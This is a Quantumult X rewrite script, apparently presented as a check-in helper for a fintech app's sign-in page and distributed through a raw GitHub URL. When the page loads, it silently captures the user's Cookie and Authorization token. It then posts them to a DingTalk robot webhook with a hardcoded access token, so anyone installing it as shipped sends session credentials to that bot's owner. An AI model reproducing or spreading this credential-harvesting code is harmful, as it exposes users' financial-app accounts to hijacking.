/*
签到页面，点分享海报即可
===================
[MITM]
hostname = fzyyj-signin.szcy-fintech.com,prod.fzyyj.fintechboc.cn


===================
【 QX  脚本配置 】 :
===================
[rewrite_local]
^https:\/\/fzyyj-signin\.szcy-fintech\.com\/assets\/save-167ad561\.png$ url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/fzyyj-sign.js

*/

if ($request) {
    let url = $request.url;
    if (url.indexOf("https://fzyyj-signin.szcy-fintech.com/assets/save-167ad561.png") !== -1) {
        
        let cookie = $request.headers['Cookie'];
        if (cookie) {
            $prefs.setValueForKey(cookie, "cookieKey");  // 保存 Cookie 到本地存储
            console.log(`cookie值:\n${cookie}`);
            
            let tokenMatch = cookie.match(/token=([^;]+)/);
            if (tokenMatch) {
                // 提取到的 token 值
                let token = tokenMatch[1].replace(/%20/g, " ");  // 将 %20 替换为空格
                
                // 保存 token 到本地存储
                $prefs.setValueForKey(token, "AuthorizationKey");  
                
                // 发送通知，显示提取的 token 和 cookie
                $notify("成功", "Authorization 已提取", `以下是获取到的 Cookie 值:\n${cookie}\n\n以下是获取到的 Authorization 值:\n${token}`);
                console.log(`Authorization值:\n${token}`);
                
                // 调用发送钉钉消息的函数
                sendDingTalkMessage(`福仔云游记的Cookie值：\n${cookie}\nAuthorization值：\n${token}`);
            } else {
                // 未找到 token 时，发送通知
                $notify("失败", "未找到 token", "请检查 Cookie");
                sendDingTalkMessage("未找到 token，请检查 Cookie。");
            }
        }

        let authorization = $request.headers['Authorization'];
        if (authorization) {
            $prefs.setValueForKey(authorization, "authKey");  // 保存 Authorization
            $notify("成功", "Authorization 已保存", authorization);
        }
    }
}

// 发送钉钉消息的函数
function sendDingTalkMessage(content) {
    let webhookURL = "https://oapi.dingtalk.com/robot/send?access_token=90315bbbc30de5de178af71a7cf78f9b78d8983957ce20a2999166e0f0a61526";  // 将此处替换为你的钉钉机器人 Webhook 地址
    let body = {
        "msgtype": "text",
        "text": {
            "content": content
        }
    };

    let options = {
        url: webhookURL,
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    };

    // 发送 POST 请求到钉钉
    $task.fetch(options).then(response => {
        console.log("钉钉消息发送成功");
    }).catch(error => {
        console.log("钉钉消息发送失败: " + error);
    });
}

$done();  // 结束脚本




